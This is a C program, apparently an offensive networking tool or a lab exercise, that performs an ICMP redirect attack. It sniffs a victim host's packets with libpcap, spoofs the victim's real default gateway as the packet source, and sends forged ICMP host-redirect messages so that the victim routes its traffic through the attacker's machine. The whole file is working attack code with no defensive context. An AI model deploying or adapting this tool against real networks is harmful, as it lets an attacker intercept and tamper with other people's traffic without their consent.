#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <memory.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include<sys/socket.h>
#include<unistd.h>
#include <arpa/inet.h>
#include <assert.h>

#define DATA_LEN 8
#define SIZE_ETHERNET 14
#define HEAD_MAX 60

uint32_t Vic_IP;
uint32_t Ori_Gw_IP;
uint32_t Redic_IP;
uint16_t ip_id=0;



/*计算校验和*/
static uint16_t checksum(void *buf,int len)
{
    uint32_t sum=0;
    uint16_t *cbuf=buf;

    while(len>1)
    {
        sum+=*cbuf++;
        len-=2;
    }

    if(len)
        sum+=*(u_int8_t *)cbuf;
    sum=(sum>>16)+(sum & 0xffff);
    sum+=(sum>>16);

    return ~sum;
}

void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
    int sockfd,res;
    int one = 1;
    int *ptr_one = &one;
    if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
    {
        printf("create sockfd error\n");
        exit(-1);
    }
    res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
    if(res < 0)
    {
        printf("error--\n");
        exit(-3);
    }
    struct iphdr*ipd=(struct iphdr*)(packet+SIZE_ETHERNET);
    uint8_t re_size=(ipd->ihl<<2)+DATA_LEN;
    uint8_t all_size=sizeof(struct iphdr)+sizeof(struct icmphdr)+re_size;
    {
        struct{
            struct iphdr ip;
            struct icmphdr icmp;
            uint8_t data[HEAD_MAX+DATA_LEN];
        }packet={
            .ip={
                .version = 4,
                .ihl = 5,
                .id=ip_id++,
                .tos = 0,
                .tot_len = htons(all_size),
                .frag_off = 0,
                .ttl = 255,
                .check = 0,
                .protocol = IPPROTO_ICMP,
                .saddr = Ori_Gw_IP,
                .daddr = Vic_IP
            },
            .icmp={
                .type = ICMP_REDIRECT,
                .code = ICMP_REDIR_HOST,
                .checksum = 0,
                .un={
                    .gateway=Redic_IP
                }
            }
        };
        memcpy(packet.data,ipd,re_size);
        packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));
        packet.icmp.checksum = checksum(&packet.icmp, sizeof(packet.icmp)+re_size);
        struct sockaddr_in dest={
            .sin_family=AF_INET,
            .sin_addr={
                .s_addr=(Vic_IP)
            }
        };
        sendto(sockfd,&packet,all_size,0,(struct sockaddr *)&dest,sizeof(dest));
    }
}

void run(char *cmd,char *out)
{
    FILE *fp=popen(cmd,"r");
    fscanf(fp,"%s",out);
    pclose(fp);
}

int main(int argv,char *args[])
{
    assert(argv==2);
    Vic_IP=inet_addr(args[1]);
    char errBuf[PCAP_ERRBUF_SIZE], * devStr;
    char ip[16];
    char buf[1024];
    /* get a device */
    devStr = pcap_lookupdev(errBuf);

    if(devStr)
    {
        printf("success: device: %s\n", devStr);
    }
    else
    {
        printf("error: %s\n", errBuf);
        exit(1);
    }
    sprintf(buf,"ifconfig %s|awk '$1 ~ /inet$/ {print $2}'|awk -F: '{print $2}'",devStr);
    run(buf,ip);
    Redic_IP=inet_addr(ip);
    printf("get ip %s\n",ip);
    sprintf(buf,"route|awk '$1 ~ /default/ {print $2}'");
    run(buf,ip);
    Ori_Gw_IP=inet_addr(ip);
    printf("get gateway %s\n",ip);

    /* open a device, wait until a packet arrives */
    pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf);

    struct bpf_program filter;
    char filterstr[50]={0};
    sprintf(filterstr,"src host %s",args[1]);
    pcap_compile(device,&filter,filterstr,1,0);
    pcap_setfilter(device,&filter);
    pcap_loop(device, -1, getPacket, NULL);


    return 0;
}
